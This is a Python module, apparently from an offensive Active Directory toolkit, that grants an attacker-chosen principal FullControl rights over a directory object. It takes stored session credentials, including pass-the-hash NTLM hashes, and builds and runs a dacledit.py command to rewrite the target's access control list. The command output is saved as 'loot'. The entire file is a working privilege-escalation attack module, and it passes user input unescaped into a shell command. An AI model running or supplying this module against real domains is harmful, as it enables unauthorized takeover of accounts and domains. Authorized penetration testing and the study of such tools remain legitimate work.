# modules/writedacl.py

from core.colors import red, green, yellow, blue
from core.helpers import run_command, save_loot
import os
from datetime import datetime

def attack_writedacl(session):
    print(blue("[*] WriteDACL Module - Granting FullControl rights via dacledit.py..."))

    target = input("[?] Enter target (SAM name or full DN): ").strip()
    if not target:
        print(red("[-] No target specified."))
        return

    # Default principal from session
    default_principal = session.username
    print(f"[?] Principal to grant rights to (default: {default_principal}):")
    principal = input("[Principal] > ").strip() or default_principal

    # Optional inheritance
    inheritance = input("[?] Add inheritance flag? (y/N): ").strip().lower() == "y"
    inheritance_flag = "-inheritance" if inheritance else ""

    # Auth setup
    if session.hash:
        auth = f"{session.domain}/{session.username} -hashes :{session.hash}"
    elif session.password:
        auth = f"{session.domain}/{session.username}:{session.password}"
    else:
        print(red("[-] No valid credentials found in session."))
        return

    # Determine if target is DN or short name
    target_flag = "-target-dn" if target.upper().startswith("CN=") or "DC=" in target.upper() else "-target"

    # Build command
    cmd = (
        f"dacledit.py -action write -rights FullControl {inheritance_flag} "
        f"-principal \"{principal}\" {target_flag} \"{target}\" "
        f"{auth} -dc-ip {session.dc_ip}"
    )

    print(blue(f"[*] Running: {cmd}"))
    out, err = run_command(cmd)
    combined = out + "\n" + err

    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    filename = f"writedacl_{target.replace('/', '_')}_{timestamp}.log"
    save_loot(filename, combined)

    if "DACL modified successfully" in combined:
        print(green("[+] DACL modification successful."))
    else:
        print(red("[-] DACL modification may have failed. Review output:"))
        print(combined.strip())
